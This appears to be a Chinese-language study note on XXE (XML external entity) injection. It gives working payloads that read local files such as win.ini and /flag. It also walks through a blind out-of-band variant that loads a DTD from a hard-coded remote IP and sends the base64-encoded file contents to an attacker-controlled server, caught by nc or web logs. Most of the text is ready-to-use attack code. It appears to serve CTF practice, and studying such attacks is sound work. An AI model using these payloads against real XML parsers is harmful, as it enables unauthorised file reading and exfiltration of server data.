# XXE基础

```
<?xml version = "1.0"?>  //xml头
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>  //主体
<na>&cc;</na>  //xml
```

xml中的标签是可以任意命名的

·



# 有回显，外部实体XXE

```
<?xml version = "1.0"?>
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>
<na>&cc;</na>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY f SYSTEM "file:///C://Windows//win/ini"> ]>
<x>&f;</x>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///C://Windows//win/ini"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```

# 无回显，外部实体，XXE



<!-- 要引用（dtd里面），所以要加百分号% -->
<!-- /flag 改成 /etc/passwd 可能会失败，因为内容太多了 -->

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hacker[
    <!ENTITY  % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY  % myurl SYSTEM "http://123.60.57.4/test.dtd">
%myurl;
]> 
```

<!-- 不能直接<!ENTITY  % myurl SYSTEM "http://vps-ip:port/%file"> ，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制-->
<!-- %myurl;会读取远程dtd文件，读到了以后，因为远程dtd文件有一个实体的定义（% dtd），那么就会解析这个实体定义。（% dtd）实体的定义内容是另外一个实体定义（&#x25; vps），那就会解析（&#x25; vps），就会执行远程请求，请求地址（http://vps-ip:port/%file），会在我们的vps日志上留下痕迹。
也可以起nc监听端口，能判断是否有向我们的vps发送请求以及请求内容。起nc的话% myurl的值，不要加端口，就vps-ip够了。
总结就是，%myurl 这种引用会自动向地址发送请求。 -->

<root>
1
</root>



vps

/var/www/html下创建test.dtd文件

```
<!ENTITY % dtd "<!ENTITY &#x25; vps SYSTEM 'http://vps-ip:port/%file;'> ">
<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

<!-- 引用（执行）dtd实体，vps被注册 -->
%dtd;
<!-- 引用（执行）vps实体，接收%file变量的内容 -->
%vps;

```

